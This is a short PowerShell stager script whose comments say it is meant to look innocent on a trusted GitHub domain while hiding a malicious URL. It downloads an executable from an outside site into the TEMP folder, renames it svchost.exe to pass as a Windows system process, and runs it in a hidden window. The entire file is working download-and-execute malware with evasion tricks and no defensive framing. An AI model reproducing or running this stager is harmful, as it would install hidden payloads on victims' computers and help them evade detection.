# This file is hosted at: https://raw.githubusercontent.com/YourUser/YourRepo/main/stager.ps1
# It looks innocent and is hosted on a trusted domain.

# The real, malicious URL is now hidden here.
 $realUrl = "https://avrasyaturizm.net/temp/calc.exe"
 $dest = "$env:TEMP\svchost.exe"

# Use a trusted method to download the final payload.
Invoke-WebRequest -Uri $realUrl -OutFile $dest
Start-Process -FilePath $dest -WindowStyle Hidden